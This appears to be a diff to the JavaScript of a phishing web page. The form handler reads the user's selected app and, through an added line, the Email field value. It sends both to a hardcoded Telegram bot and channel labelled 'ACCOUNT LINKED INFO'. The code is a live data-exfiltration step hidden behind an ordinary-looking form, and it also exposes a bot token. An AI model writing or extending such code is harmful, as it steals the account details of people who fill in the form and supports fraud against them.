@@ -27,10 +27,11 @@ document.mainForm.onclick = function(){
 }
 function function1() {
   var radVal = document.mainForm.rads.value;
+  var uname = document.mainForm.Email.value;
   result.innerHTML = 'You selected: '+radVal;  
   let xhr = new XMLHttpRequest();
 fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=ACCOUNT LINKED INFO:"+"APP="+radVal);
-fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=ACCOUNT LINKED INFO: USERNAME=");
+fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=ACCOUNT LINKED INFO: USERNAME= "+uname);
 } 
 </script>
 END_OF_TEXT;
